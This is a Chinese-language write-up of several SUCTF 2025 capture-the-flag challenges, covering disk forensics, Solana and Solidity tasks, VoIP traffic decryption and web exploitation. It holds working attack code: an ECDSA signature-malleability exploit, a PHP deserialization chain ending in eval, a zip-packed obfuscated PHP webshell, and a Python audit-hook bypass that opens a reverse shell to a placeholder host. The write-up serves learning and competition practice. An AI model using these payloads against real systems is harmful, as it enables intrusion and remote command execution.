### SU\_forensics

看着题目的提示说运行了某些命令之后用"sudo reboot"重启了主机，接着他按照网上清除入侵记录的方法先"rm -rf .bash\_history"然后"history -c"删除了所有的命令记录,直接用strings开搜`sudo reboot`​,最后在第二个vmdk文件搜到了

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-00-58.png" alt="SUCTF_2025_Writeup-2025-01-14-16-00-58" position="center" style="border-radius: 1px;" >}}

```Bash
1650679-echo "My secret has disappeared from this space and time, and you will never be able to find it."
1650680-curl -s -o /dev/null https://www.cnblogs.com/cuisha12138/p/18631364
1650681:sudo reboot
```

直接打开发现被删除了看不到但是有 `Wayback Machine`​

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-01-12.png" alt="SUCTF_2025_Writeup-2025-01-14-16-01-12" position="center" style="border-radius: 1px;" >}}

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-01-16.png" alt="SUCTF_2025_Writeup-2025-01-14-16-01-16" position="center" style="border-radius: 1px;" >}}

https://github.com/testtttsu/homework

看得到是恢复删除的commit记录，也留了三位a4b,可以写个脚本爆破

```Python
import requests
import time
import random
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class GitCommitChecker:
    def __init__(self, base_url, retries=5, timeout=10):
        self.base_url = base_url
        self.session = self.create_session(retries)
        self.timeout = timeout
  
    def create_session(self, retries):
        """Create and configure the requests session."""
        session = requests.Session()
        retry_strategy = Retry(
            total=retries,  
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        session.mount('http://', HTTPAdapter(max_retries=retry_strategy))
        session.mount('https://', HTTPAdapter(max_retries=retry_strategy))
        return session

    def check_commit(self, commit_hash):
        """Check if the commit exists by sending a HEAD request."""
        url = f"{self.base_url}/commit/{commit_hash}"
        try:
            response = self.session.head(url, timeout=self.timeout)
            if response.status_code == 200:
                print(f"Valid commit found: {url}")
                return True
        except requests.exceptions.RequestException as e:
            print(f"Error with commit {commit_hash}: {e}")
        return False

    def generate_hashes(self):
        """Generate hash combinations to be tested."""
        hex_chars = string.hexdigits.lower()
        for part1 in hex_chars:
            for part2 in hex_chars:
                for part3 in hex_chars:
                    for part4 in hex_chars:
                        yield f"{part1}{part2}{part3}{part4}"

    def find_commit(self, skip_hash="6129"):
        """Try to find the valid commit hash."""
        for commit_hash in self.generate_hashes():
            if commit_hash == skip_hash:
                continue
            print(f"Trying hash: {commit_hash}")
            if self.check_commit(commit_hash):
                return commit_hash
            time.sleep(0.2)  # Avoid hitting the server too quickly
        return None

def main():
    base_url = "https://github.com/testtttsu/homework"
    checker = GitCommitChecker(base_url)
  
    found_commit = checker.find_commit()
  
    if found_commit:
        print(f"Suspicious commit found: {found_commit}")
    else:
        print("No suspicious commit found.")

if __name__ == "__main__":
    main()
```

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-01-31.png" alt="SUCTF_2025_Writeup-2025-01-14-16-01-31" position="center" style="border-radius: 1px;" >}}

https://github.com/testtttsu/homework/commit/1227#diff-353f7b5da4feff34508ce73fb5c080cb3c78b45cbe96bdfa3572c4cabe46a4da

拿下来运行脚本执行后得到一个zip，密码其实没有遮挡完全就是`2phxMo8iUE2bAVvdsBwZ`​

解密后得到一张图片得到的图片其实细看能发现有 27 种符号，假设是 26 个字母加空格。写代码对图像进行切块识别(这里直接用了`RGB`​平均值范数聚类,也可以用 `imagehash `​等),先假设出现次数最多的为空格，其他字符按序标注，结果直接尝试丢 quipquip 跑解密发现可行，然后得到的大抵是这样,然后可以发现其实后面的是 [Pangram](https://en.wikipedia.org/wiki/Pangram),缺少的就是最后的 flag 为 SUCTF{HAVEFUN}

```Plain
A QUICK ZEPHYR BLOW VEXING DAFT JIM
FRED SPECIALIZED IN THE JOB OF MAKING VERY QABALISTIC WAX TOYS
SIX FRENZIED KINGS VOWED TO ABOLISH MY QUITE PITIFUL JOUSTS
MAY JO EQUAL MY FOOLISH RECORD BY SOLVING SIX PUZZLES A WEEK
HARRY IS JOGGING QUICKLY WHICH AXED ZEN MONKS WITH ABUNDANT VAPOR
DUMPY KIBITZER JINGLES AS QUIXOTIC OVERFLOWS
NYMPH SING FOR QUICK JIGS VEX BUD IN ZESTFUL TWILIGHT
SIMPLE FOX HELD QUARTZ DUCK JUST BY WING
STRONG BRICK QUIZ WHANGS JUMPY FOX VIVIDLY
GHOSTS IN MEMORY PICKS UP QUARTZ AND VALUABLE ONYX JEWELS
PENSIVE WIZARDS MAKE TOXIC BREW FOR THE EVIL QATARI KING AND WRY JACK
ALL OUTDATED QUERY ASKED BY FIVE WATCH EXPERTS AMAZED THE JUDGE
```

脚本如下

```Bash
from collections import Counter
from string import ascii_uppercase
from PIL import Image, ImageDraw, ImageFont
import numpy as np
import random
import json

ROW = 12
COL = 69

# [1] 读取图片并切块、提取特征向量

image = Image.open("E:\CTF\Competitions\XCTF\9th\SUCTF\SU_forensics\homework-main\secret\lost_flag.png")
image = image.convert('RGB')

width, height = image.size
grid_height = height // ROW
grid_width = width // COL

grids = [[None for _ in range(COL)] for _ in range(ROW)]

for i in range(ROW):
    for j in range(COL):
        left, top = j * grid_width, i * grid_height
        right, bottom = left + grid_width, top + grid_height
        grids[i][j] = image.crop((left, top, right, bottom))

feature_vectors = [[np.mean(grids[i][j], axis=(0, 1))
                    for j in range(COL)] for i in range(ROW)]

# [2] 利用特征向量对小块进行聚类

THRESHOLD = 0.1  # 相似度阈值

groups: list[list[tuple[int, int]]] = []
for i in range(ROW):
    for j in range(COL):
        current_feature = feature_vectors[i][j]
        if sum(current_feature) == 0:
            continue
        found_group = False
        for group in groups:
            representative_feature = feature_vectors[group[0][0]][group[0][1]]
            if np.linalg.norm(np.array(current_feature) -
                              np.array(representative_feature)) < THRESHOLD:
                group.append((i, j))
                found_group = True
                break
        if not found_group:
            groups.append([(i, j)])

# [3] 用字母对小块进行标记

girds_mark = [[0 for _ in range(COL)] for _ in range(ROW)]
for idx, group in enumerate(groups):
    for (i, j) in group:
        girds_mark[i][j] = idx + 1

# 出现次数最多的视为空格（事实也确实如此）
counter = Counter([i for row in girds_mark for i in row if i != 0])
space = counter.most_common(1)[0][0]

table = {i: ascii_uppercase[idx] for idx, i in enumerate(
    [idx for idx in range(1, len(groups) + 1) if idx != space])}
table[space] = ' '
table[0] = ''

content = ''
for i in range(ROW):
    for j in range(COL):
        content += table[girds_mark[i][j]]
    content += '\n'
print(content)

# 将这一步的输出内容使用 quipqiup.com 解密，得到密码表

# [4] 根据密码表解密

trans_table = str.maketrans(ascii_uppercase, 'AQUICKZEPHYRBLOWVXNGDFTJMS')
plaintext = content.translate(trans_table)

# [5] 寻找每行没有出现的字母，得到最终结果

for row in plaintext.split('\n'):
    for ch in ascii_uppercase:
        if ch not in row:
            print(ch, end='')
            break
    else:
        print(' ', end='')
print()
```

### Onchain Checkin

​`solana`​的环境看到给了一个`Program ID`​  为`SUCTF2Q25DnchainCheckin11111111111111111111`​,那就直接去搜索(`Anchor.toml`​里面也写了`cluster`​为`devnet`​)
```
https://explorer.solana.com/address/SUCTF2Q25DnchainCheckin11111111111111111111?cluster\=devnet
```
在 `Checkin`​ 结构体的 `checkin`​ 方法中，代码中有：

```Rust
msg!("flag1");
```

那就直接看运行的日志的output就行,发现flag1和flag2都在日志了

```Rust
self.checkin_state.flag3 = self.account3.key();
```

这里的 `flag3`​ 是 `account3`​ 的公钥

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-01-41.png" alt="SUCTF_2025_Writeup-2025-01-14-16-01-41" position="center" style="border-radius: 1px;" >}}

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-01-47.png" alt="SUCTF_2025_Writeup-2025-01-14-16-01-47" position="center" style="border-radius: 1px;" >}}

### Onchain Magician

首先先拿到源码然后分析一下

```Solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

contract MagicBox {
    struct Signature {
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    address magician;
    bytes32 alreadyUsedSignatureHash;
    bool isOpened;

    constructor() {}

    function isSolved() public view returns (bool) {
        return isOpened;
    }

    function getMessageHash(address _magician) public view returns (bytes32) {
        return keccak256(abi.encodePacked("I want to open the magic box", _magician, address(this), block.chainid));
    }

    function _getSignerAndSignatureHash(Signature memory _signature) internal view returns (address, bytes32) {
        address signer = ecrecover(getMessageHash(msg.sender), _signature.v, _signature.r, _signature.s);
        bytes32 signatureHash = keccak256(abi.encodePacked(_signature.v, _signature.r, _signature.s));
        return (signer, signatureHash);
    }

    function signIn(Signature memory signature) external {
        require(magician == address(0), "Magician already signed in");
        (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
        require(signer == msg.sender, "Invalid signature");
        magician = signer;
        alreadyUsedSignatureHash = signatureHash;
    }

    function openBox(Signature memory signature) external {
        require(magician == msg.sender, "Only magician can open the box");
        (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
        require(signer == msg.sender, "Invalid signature");
        require(signatureHash != alreadyUsedSignatureHash, "Signature already used");
        isOpened = true;
    }
}
```

合约中的 `signIn`​ 和 `openBox`​ 方法都依赖于`ECDSA`​签名，可以用`secp256k1`​ 曲线签名调整了 `s`​ 值来绕过,步骤就是`获取原始签名->调整s值->使用重签后的签名来调用signIn 和 openBox 方法`​，直接`foundry`​打

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Script, console2 } from "forge-std/Script.sol";
import { MagicBox } from "src/Chall.sol";

contract exp is Script { 
    function run() external {
        MagicBox target = MagicBox(vm.envAddress("target"));

        address attacker = vm.envAddress("account");
        uint256 privateKey = vm.envUint("key");

        bytes32 messageHash = target.getMessageHash(attacker);
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(privateKey, messageHash);
        // secp256k1 曲线的阶 n
        uint256 n = uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141);

        v1 = 28;
        MagicBox.Signature memory signature1 = MagicBox.Signature(v1, r1, s1);

        uint256 newS = n - uint256(s1);  // 调整 s 的值，确保签名有效
        MagicBox.Signature memory signature2 = MagicBox.Signature(27, r1, bytes32(newS));

        vm.startBroadcast();
        target.signIn(signature1);
        target.openBox(signature2);
        vm.stopBroadcast();
    }
}
```

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-02-02.png" alt="SUCTF_2025_Writeup-2025-01-14-16-02-02" position="center" style="border-radius: 1px;" >}}

🥰🥰🥰 SUCTF{C0n9r4ts!Y0u're\_An\_0ut5taNd1ng\_OnchA1n\_Ma9ic1an.}

### SU\_VOIP

```Plain
密码部分的
第一个压缩包的密码是：boss密码+字符
第二个压缩包密码是：hash（字符+boss密码）
hint:1.ASR whisper 2. DTMF 3. echo 'xxxx' | sha256sum (kali)
```

在 `tcp.stream eq 7`​ 有个通过 `sip`​ 的 `message`​ 请求传输 `base64`​ 编码的 `7z`​ 压缩包,然后 `http`​ 流中有一个加密的 `flag.7z`​

流量中有`RTP`​协议的数据,但是这里直接选择`wireshark`​的电话选择`VOIP`​然后用`RTP`​播放器播放听到的只有铃声和一些噪声，于是查看了一下协议发现以`UDP`​为主然后发现也有存在单向的`RTP`​流和大量连续的`UDP`​的包，于是这里在进行协议解析的时候同时把`RTP_UDP`​勾选上重新解析一次

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-02-32.png" alt="SUCTF_2025_Writeup-2025-01-14-16-02-32" position="center" style="border-radius: 1px;" >}}

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-02-37.png" alt="SUCTF_2025_Writeup-2025-01-14-16-02-37" position="center" style="border-radius: 1px;" >}}

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-02-42.png" alt="SUCTF_2025_Writeup-2025-01-14-16-02-42" position="center" style="border-radius: 1px;" >}}

于是这样就可以重新解析之后再次查看`RTP`​流就会发现很多条数据流，然后在第一条里面就有通话

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-02-46.png" alt="SUCTF_2025_Writeup-2025-01-14-16-02-46" position="center" style="border-radius: 1px;" >}}

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-02-51.png" alt="SUCTF_2025_Writeup-2025-01-14-16-02-51" position="center" style="border-radius: 1px;" >}}

然后分析一下听出重点的句子就是关于密码的部分(连读的`eight 8s`​真有点神)，可以跑whisper就听的清晰

```Plain
员工A：嘿，小李，你最近有没有注意到公司的通话系统有些变化？
Employee A: Hey, Xiao Li, have you noticed any changes in the company's call system recently?

员工B：哦，是的，我听说过。好像是要进行安全升级。
Employee B: Oh, yes, I've heard about it. It seems like there's going to be a security upgrade.

员工A：没错，IT部门发了通知，说下周一开始会更新系统，可能会有短暂的中断。
Employee A: That's right, the IT department sent out a notice saying they will update the system starting next Monday, and there might be a brief interruption.

员工B：那我们得提醒大家提前做好准备，以免影响工作。
Employee B: Then we need to remind everyone to prepare in advance to avoid affecting work.

对话二：

员工A：小李，你知道老板的电脑密码吗？我需要访问一些重要文件。
Employee A: Xiao Li, do you know the boss's computer password? I need to access some important files.

员工B：哈哈，老板的密码总是很简单。他经常用同一个密码。
Employee B: Haha, the boss's password is always simple. He often uses the same one.

员工A：真的吗？那重要文件的密码呢？
Employee A: Really? What about the password for important files?

员工B：如果是重要文件，他通常会在后面加上8个8。别忘了，老板的工号是1003。
Employee B: If it's an important file, he usually adds eight 8s at the end. Don't forget, the boss's employee number is 1003.

员工A：明白了，这样就好办多了。
Employee A: Got it, that makes it much easier.
```

这里说到了工号是1003那我们可以重点看`sip`​协议的事件里面`id`​为`1003`​的事件，然后跟进一下数据

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-03-03.png" alt="SUCTF_2025_Writeup-2025-01-14-16-03-03" position="center" style="border-radius: 1px;" >}}

看着是考察`SIP digest authentication`​,然后可以根据获取到的信息去写哈希，具体格式可以看下面的

https://hashcat.net/forum/thread-6571.html

```Plain
$sip$***[username]*[realm]*GET*[uri_protocol]*[uri_ip]*[uri_port]*[nonce]*[clientNonce]*[nonceCount]*[qop]*MD5*[response]
```

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-03-14.png" alt="SUCTF_2025_Writeup-2025-01-14-16-03-14" position="center" style="border-radius: 1px;" >}}

```undefined
$sip$*192.168.223.154*192.168.223.131*1003*asterisk*REGISTER*sip*192.168.223.154*5060*1736015639/c5e07e8c27420ad301ce1c58122c4ad3*de945f5309484651b55f8c8ae2cdd69c*00000001*auth*MD5*5f449ec78c45bd3bf595d8e66a5d5cda
verde351971
```

于是到这里第一个压缩包的密码就知道了就是`verde35197188888888`​，解密后得到一个`decrypt.key`​是一个`RSA`​私钥文件,然后查看流量中还有`TLS`​的流量然后端口为`5061`​其实就是一个加密的`SIP`​通话,于是在这里导入一下私钥

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-03-27.png" alt="SUCTF_2025_Writeup-2025-01-14-16-03-27" position="center" style="border-radius: 1px;" >}}

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-03-32.png" alt="SUCTF_2025_Writeup-2025-01-14-16-03-32" position="center" style="border-radius: 1px;" >}}

看解密后的流量还发现了`SRTP`​协议然后搜到了类似的文章

https://atcomsystems.ca/2023/03/31/extreme-voip-troubleshooting-decrypt-tls-sip-and-srtp/

我们需要把`SRTP`​的流量解密回`RTP`​然后最后再得到音频再进行`DTMF`​

于是我们先去追踪`TLS`​流解密后的`OK`​的数据包的`SDP`​中找到内联密钥来实现`srtp-decrypt`​

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-03-57.png" alt="SUCTF_2025_Writeup-2025-01-14-16-03-57" position="center" style="border-radius: 1px;" >}}

于是这里我们先都导出一下`SRTP`​数据包然后用上面链接给的[项目](https://github.com/gteissier/srtp-decrypt)进行解密,这里根据`RTP`​和`SRTP`​的长度直接过滤出所有的数据包然后重新导出为新的`PCAP`​文件,在这里有很多内联密钥,一个一个试直到密钥为`wjhGQIssJovzw2XVYYulF0Q6xcDOgXNiFMLIJE4m`​的时候可以解密所有的对话

```Bash
./srtp-decrypt -k wjhGQIssJovzw2XVYYulF0Q6xcDOgXNiFMLIJE4m < 111.pcap >output.txt
```

​`frame 33555 dropped: decoding failed 'Permission denied'`​**如果出现类似的没关系看导出的文件是否有内容就可以，** 然后将`txt`​文件使用 `File>Import HEX Dump`​ 将其导入 `Wireshark`​(关于导入记得**选择 UDP 作为协议并输入一些假端口号**)

然后得到以下对话

```Plain
1老板：你好，王先生，感谢你今天能过来讨论我们的供货合同。
Boss: Hello, Mr. Wang, thank you for coming to discuss our supply contract today.

2供应商：您好，很高兴能再次合作。我们这次的报价和交货时间都做了一些调整，希望能更符合您的需求。
Supplier: Hello, it's a pleasure to work together again. We've made some adjustments to our pricing and delivery schedule this time, hoping to better meet your needs.

3老板：好的，我刚好在记录一些重要信息，请稍等……（开始在键盘上敲打）
Boss: Okay, I'm just recording some important information, please hold on... 

4供应商：当然，您请便。
Supplier: Of course, please go ahead.

5老板：（一边敲打键盘一边说）抱歉，我正在记录一组密码，您知道的，现在信息安全很重要。
Boss: (while typing) Sorry, I'm recording a password, you know, information security is very important nowadays.

6供应商：是的，安全问题不容忽视。
Supplier: Yes, security issues cannot be ignored.

7老板：我最近发现我原来的密码使用方法不太安全，现在我喜欢用记录的密码和常用密码组合起来，然后进行哈希运算作为我机密文件的密码，这样就更安全了。
Boss: I recently discovered that my original way of using passwords wasn't very secure. Now I like to combine recorded passwords with common ones and then hash them to use as passwords for my confidential files, making it more secure.

8供应商：这是个好主意，能有效提升安全性。
Supplier: That's a good idea, it can effectively enhance security.

9老板：没错，这样即使有人知道了其中一个密码，也无法轻易破解我的账户。
Boss: Exactly, this way, even if someone knows one of the passwords, they can't easily crack my account.
```

但是现在我们还是找不到`DTMF`​的内容(根据`hint`​的内容就是新密码就是`DTMF`​+`SIP`​解出的常用密码)

然后再次尝试到`a8sNIWscKZ+6YPAWoD54xINqumzHr3XYaJz8b8DP`​密钥的时候再次得到`DTMF`​数据，然后直接`rtpevent`​筛选一下

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-06-27.png" alt="SUCTF_2025_Writeup-2025-01-14-16-06-27" position="center" style="border-radius: 1px;" >}}

得到`DTMF`​的按键为`58912598719870574`​

所以`flag.7z`​的密码为`hash(58912598719870574verde351971)`​

```Bash
└─$ echo "58912598719870574verde351971" | sha256sum
5c0b1d057aa7d5e9f7b2b10387f58540e2a6f9fc82ccb5d5f3cb2915aa0d1f77
```

解密压缩包得到flag为SUCTF{51d7901e-3ff2-4bd7-9684-2b307a2cd8e9}

## Web

### SU\_POP

```Bash
React\Promise\Internal\RejectedPromise::__destruct()
-->Cake\Http\Response::__toString()
-->Cake\ORM\Table::__call()
-->Cake\ORM\BehaviorRegistry::call()
-->PHPUnit\Framework\MockObject\Generator\MockClass::generate()
```

```Bash
<?php
namespace React\Promise\Internal;

class RejectedPromise {
    public $handled = false;
    public $reason;

    public function __construct() {
        $this->reason = new \Cake\Http\Response();
    }
    public function __destruct() {
        if ($this->handled) {
            return; 
        }
        $handler = null; 
        if ($handler === null) {
            $message = 'Unhandled promise rejection with ' . $this->reason;
            \error_log(message: $message); 
            return;
        }
    }
}


namespace Cake\Http;

class Response {
    public $stream;

    public function __construct() {
        $this->stream = new \Cake\ORM\Table();
    }

    public function __toString() {
        $this->stream->rewind(); 
        return $this->stream->getContents(); 
    }
}

namespace Cake\ORM;

class Table {
    public $_behaviors;

    public function __construct() {
        $this->_behaviors = new BehaviorRegistry();
    }
    public function __call(string $method, array $args) {
        if ($this->_behaviors->hasMethod($method)) {
           return $this->_behaviors->call($method, $args);
        }
    }
}
class ObjectRegistry {}

class BehaviorRegistry extends ObjectRegistry {
     public $_methodMap;
     public $_loaded;
    public function __construct() {
        $this->_methodMap = ['rewind' => ['test', 'generate']];
        $this->_loaded = ['test' => new \PHPUnit\Framework\MockObject\Generator\MockClass()];
    }
    public function hasMethod(string $method): bool {
        $method = strtolower($method);
        return isset($this->_methodMap[$method]);
    }
    public function has(string $name): bool {
        return isset($this->_loaded[$name]);
    }

    public function call(string $method, array $args = []) {
        $method = strtolower($method); 
        if ($this->hasMethod($method) && $this->has($this->_methodMap[$method][0])) {
            list($behavior, $callMethod) = $this->_methodMap[$method];
            return $this->_loaded[$behavior]->{$callMethod}(...$args);
        }
    }
}

namespace PHPUnit\Framework\MockObject\Generator;

final class MockClass {
    public $classCode;
    public $mockName;
    public function __construct() {
        $this->classCode = '
            $command = "phpinfo();";
      $this->mockName = "y7";
    }

    public function generate() {
        if (!class_exists($this->mockName, false)) {
            eval($this->classCode);
        }
        return $this->mockName; 
    }
}


namespace React\Promise\Internal;

$shizi = new RejectedPromise();
echo base64_encode(serialize($shizi));

?>
```

前面看exp就不过多赘述

call参考这篇文章 \$this-\>\_behaviors 会调用转发到  BehaviorRegistry::call()

[https://xz.aliyun.com/t/9995?time__1311=n4%2BxnD0DuDRDcGiGCDyDBqOoWP0K5PDt1QYQhOe4D#toc-7](https://xz.aliyun.com/t/9995?time__1311=n4%2BxnD0DuDRDcGiGCDyDBqOoWP0K5PDt1QYQhOe4D#toc-7)

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-06-51.png" alt="SUCTF_2025_Writeup-2025-01-14-16-06-51" position="center" style="border-radius: 1px;" >}}

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-06-56.png" alt="SUCTF_2025_Writeup-2025-01-14-16-06-56" position="center" style="border-radius: 1px;" >}}

控制\_methodMap将rewind映射到 MockClass .最后利用generate写

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-07-04.png" alt="SUCTF_2025_Writeup-2025-01-14-16-07-04" position="center" style="border-radius: 1px;" >}}

最后还有个suid提权find即可

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-07-10.png" alt="SUCTF_2025_Writeup-2025-01-14-16-07-10" position="center" style="border-radius: 1px;" >}}

### SU\_photogallery

首先先看一下前端的表单,然后看页面测试了一下就可以直接上传`ZIP`​文件

```HTML
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SU photogallery</title>
    <link rel="stylesheet" href="./index.css">
    <link rel="icon" href="SU.ico" type="image/x-icon">
</head>

<body>
    <div class="container">
        <!-- 上传单个图片 -->
        <div class="container_form container-image">
            <form action="" method="post" class="form" id="form2">
                <h1 class="form_title">Working...</h1>
            </form>
        </div>
        <!-- 上传压缩包 -->
        <div class="container_form container-zip">
            <form action="unzip.php" method="POST" enctype="multipart/form-data" class="form" id="form2">
                <h1 class="form_title">Upload zip</h1>
                <input type="file" name="file" id="file" accept=".zip" required class="upload_zip">
                <br><br>
                <button type="submit" class="btn">Upload</button>
            </form>
        </div>  
        <!-- 罩 -->
        <div class="container_mask">
            <div class="mask">

                <div class="mask_cover mask-left">
                    <button type="button" class="btn" id="image">上传图片</button>
                </div>
                <div class="mask_cover mask-right">
                    <button type="button" class="btn" id="zip">批量上传</button>
                </div>

            </div>
        </div>
    </div>
    <script>
        function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    const status = getQueryParam('status');

    if (status) {
        switch (status) {
            case 'success':
                alert('文件上传成功！');
                break;
            case 'zip_not_found':
                alert('上传的文件不存在，请检查后重试！');
                break;
            case 'zip_open_failed':
                alert('无法打开 ZIP 文件，请检查文件格式！');
                break;
            case 'malicious_content_detected':
                alert('答应我，别这样！');
                break;
            case 'mkdir_failed':
                alert('创建解压目录失败，请联系管理员！');
                break;
            case 'extract_failed':
                alert('解压文件失败，别搞！');
                break;
            case 'move_failed':
                alert('移动文件失败，请检查文件路径！');
                break;
            case 'file_error':
                alert('文件上传失败，请重新尝试！');
                break;
            default:
                alert('未知错误，请稍后重试！');
        }
    }
        const loginBtn = document.getElementById("image");
        const enrollBtn = document.getElementById("zip");
        const fistForm = document.getElementById("form1");
        const secondForm = document.getElementById("form2");
        const container = document.querySelector(".container");
        enrollBtn.addEventListener("click", () => {
            container.classList.add("right-cover-active");
        });
        loginBtn.addEventListener("click", () => {
            container.classList.remove("right-cover-active");
        });
    </script>
</body>
</html>
```

​`robots.txt->node.md`​

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-07-24.png" alt="SUCTF_2025_Writeup-2025-01-14-16-07-24" position="center" style="border-radius: 1px;" >}}

不过也就是再次提醒了可以去使用一下`ZIP`​，这里随便上传一些有恶意图片的压缩包会被`WAF`​，于是这里就是想着继续去尝试寻找信息

后续尝试可以利用`PHP Development Server源码泄露`​读到源码

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-07-27.png" alt="SUCTF_2025_Writeup-2025-01-14-16-07-27" position="center" style="border-radius: 1px;" >}}

主要在这块,是在上传的时候就解压压缩包了,可以直接利用解压报错,参考以下两篇文章

https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html

[https://twe1v3.top/2022/10/CTF中zip文件的使用/#利用姿势onezip报错解压](https://twe1v3.top/2022/10/CTF%E4%B8%ADzip%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/#%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BFonezip%E6%8A%A5%E9%94%99%E8%A7%A3%E5%8E%8B)

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-07-48.png" alt="SUCTF_2025_Writeup-2025-01-14-16-07-48" position="center" style="border-radius: 1px;" >}}

拼接绕过黑名单

```Python
import zipfile
import io

mf = io.BytesIO()
with zipfile.ZipFile(mf, mode="w", compression=zipfile.ZIP_STORED) as zf:
    zf.writestr('fff.php', b'''@<?php $a = "sy"."s"."tem"; $a("ls / ");?>''')
    zf.writestr('A'*5000, b'AAAAA')

with open("shell.zip", "wb") as f:
    f.write(mf.getvalue())
```

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-08-11.png" alt="SUCTF_2025_Writeup-2025-01-14-16-08-11" position="center" style="border-radius: 1px;" >}}

### SU\_easyk8s\_on\_aliyun(REALLY VERY EASY)

这里先获取个`shell`​,简单的反弹`shell`​的`payload`​回来会是`python`​的环境而不是`bash`​，看得出这里得绕过一个`audit.py`​里面的内容

​`audit.py`​

```Python
##audit.py


import sys

DEBUG = False

def audit_hook(event, args):
    audit_functions = {
        "os.system": {"ban": True},
        "subprocess.Popen": {"ban": True},
        "subprocess.run": {"ban": True},
        "subprocess.call": {"ban": True},
        "subprocess.check_call": {"ban": True},
        "subprocess.check_output": {"ban": True},
        "_posixsubprocess.fork_exec": {"ban": True},
        "os.spawn": {"ban": True},
        "os.spawnlp": {"ban": True},
        "os.spawnv": {"ban": True},
        "os.spawnve": {"ban": True},
        "os.exec": {"ban": True},
        "os.execve": {"ban": True},
        "os.execvp": {"ban": True},
        "os.execvpe": {"ban": True},
        "os.fork": {"ban": True},
        "shutil.run": {"ban": True},
        "ctypes.dlsym": {"ban": True},
        "ctypes.dlopen": {"ban": True}
    }
    if event in audit_functions:
        if DEBUG:
            print(f"[DEBUG] found event {event}")
        policy = audit_functions[event]
        if policy["ban"]:
            strr = f"AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}"
            print(strr)
            raise PermissionError(f"[AUDIT BANNED]{event} is not allowed.")
        else:
            strr = f"[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}"
            print(strr)
            return

sys.addaudithook(audit_hook)
```

经典的`pyjail`​一下，找一个能绕过`audit`​的`payload`​改一下

https://xz.aliyun.com/t/12647?time\_\_1311\=GqGxuDRiYiwxlrzG7DyGQjb2if0ox#toc-37

```Python
import socket, os, _posixsubprocess; s=socket.socket(); s.connect(("xxxx",9999)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; _posixsubprocess.fork_exec([b"/bin/bash", "-c", b"echo b64-payload | base64 -d | bash -i"], [b"/bin/bash"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False)
```

